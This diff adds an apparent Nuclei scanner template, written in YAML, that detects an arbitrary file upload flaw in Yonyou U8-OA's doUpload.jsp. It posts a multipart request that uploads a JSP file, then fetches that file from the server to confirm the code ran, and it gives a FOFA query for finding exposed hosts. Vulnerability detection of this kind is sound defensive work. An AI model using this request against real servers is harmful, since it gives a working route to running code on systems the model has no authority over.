@@ -1,0 +1,55 @@
+id: yonyou-u8-doUpload-fileupload
+info:
+  name: 用友 U8 OA 协同工作系统 doUpload.jsp - fileupload
+  author: leadlife
+  severity: critical
+  description: 用友U8-OA 协同工作系统遵循 J2EE 架构,以 JSP 和 JAVA BEAN 技术作为主要的系统实现手段,开发出了工作流、文档、消息提醒和插件接口。用友U8-OA协同工作系统doUpload.jsp接口存在任意文件上传漏洞。
+  reference: 
+    - https://blog.csdn.net/qq_56698744/article/details/136271401
+    - https://wiki.wy876.cn/#/%E7%94%A8%E5%8F%8BU8-OA%E5%8D%8F%E5%90%8C%E5%B7%A5%E4%BD%9C%E7%B3%BB%E7%BB%9FdoUpload.jsp%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E
+  metadata:
+    verified: true
+    fofa-query: title="用友U8-OA"
+  tags: yonyou,fileupload,oa,u8
+
+variables:
+  num: '{{rand_int(800000000, 1000000000)}}'
+
+http:
+  - raw:
+      - |
+        POST /yyoa/portal/tools/doUpload.jsp HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: close
+        Upgrade-Insecure-Requests: 1
+        Content-Length: 219
+        Content-Type: multipart/form-data; boundary=7b1db34fff56ef636e9a5cebcd6c9a75
+        
+        --7b1db34fff56ef636e9a5cebcd6c9a75
+        Content-Disposition: form-data; name="iconFile"; filename="info.jsp"
+        Content-Type: application/octet-stream
+        
+        <% out.println("{{num}}"); %>
+        --7b1db34fff56ef636e9a5cebcd6c9a75--
+      
+      - |
+        GET /yyoa/portal/upload/{{shell_filename}} HTTP/1.1
+        Host: {{Hostname}}
+
+    extractors:
+      - type: regex
+        name: shell_filename
+        internal: true
+        part: body_1
+        regex:
+          - '\b[\w\-\/]+\.jsp\b'
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code_1 == 200 && status_code_2 == 200
+          - contains(body_2,'{{num}}')
+        condition: and
